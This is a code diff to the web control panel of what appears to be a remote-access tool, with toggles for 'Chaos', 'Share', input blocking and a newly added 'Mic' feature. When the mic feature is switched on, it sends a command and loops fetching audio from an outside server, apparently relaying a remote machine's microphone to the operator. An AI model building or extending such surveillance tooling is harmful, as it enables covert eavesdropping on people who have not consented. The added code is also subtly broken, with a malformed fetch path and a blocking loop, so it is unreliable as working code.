@@ -90,6 +90,7 @@
       <button id="flip-toggle" style="background-color:{{fc}}">Chaos: {{fs}}</button>
       <button id="share-toggle" style="background-color:{{shc}}">Share: {{shs}}</button>
       <button id="IN-toggle" style="background-color:{{ic}}">IN_Block: {{is1}}</button>
+      <button id="mic-toggle" style="background-color:{{mc}}">Mic: {{ms}}</button>
     </div>
 
     <div class="left-sidebar">
@@ -189,7 +190,7 @@ const openbtn = document.getElementById("open-btn");
 const dropdown = document.getElementById("Dropdown");
 const runbtn = document.getElementById("run-btn");
 const exeInput = document.getElementById("center-file-input");
-
+let mic
 let isadded = false;
 let cmd;
 let state;
@@ -204,7 +205,16 @@ dropdown.addEventListener("change", () => {
   });
   fetchButtonState()
 });
-
+async function playAudio(){
+  while(mic){
+    const response = await fetch("/https://server-20zy.onrender.com/audio",{method:"GET"})
+    const data = await response.arrayBuffer()
+    const blob = new Blob([data], { type: 'audio/mpeg' })
+    const audioUrl = URL.createObjectURL(blob);
+    const audio = new Audio(audioUrl);
+    audio.play()
+  }
+}
 async function fetchButtonState() {
   try {
     const response = await fetch('/static/state.json');
@@ -216,6 +226,13 @@ async function fetchButtonState() {
     initializeToggleButton('flip-toggle', 'Chaos', data.flipToggleState.state || 'off');
     initializeToggleButton('share-toggle', 'Share', data.shareToggleState.state || 'off');
     initializeToggleButton('IN-toggle', 'IN_Block', data.INToggleState.state || 'off');
+    initializeToggleButton('mic-toggle', 'Mic', data.micToggleState.state || 'off');
+    if(data.micToggleState.state === "on"){
+      mic = true
+    }
+    else{
+      mic = false
+    }
   } catch (error) {
     console.error('Error fetching button state:', error);
   }
@@ -223,12 +240,10 @@ async function fetchButtonState() {
 
 function initializeToggleButton(buttonId, defaultText, initialState) {
   const button = document.getElementById(buttonId);
-
   const newButton = button.cloneNode(true);
   button.replaceWith(newButton);
 
   const updatedButton = document.getElementById(buttonId);
-  
   updatedButton.dataset.state = initialState;
   updatedButton.style.backgroundColor = initialState === 'on' ? 'green' : 'red';
   updatedButton.textContent = `${defaultText}: ${initialState === 'on' ? 'On' : 'Off'}`;
@@ -247,6 +262,9 @@ function initializeToggleButton(buttonId, defaultText, initialState) {
       cmd = "sHaRe"
     }else if (defaultText === "IN_Block"){
       cmd = "bLoCk"
+    }else if (defaultText === "Mic"){
+      cmd = "mIc"
+      playAudio()
     }
 
     if (updatedButton.dataset.state === 'on') {
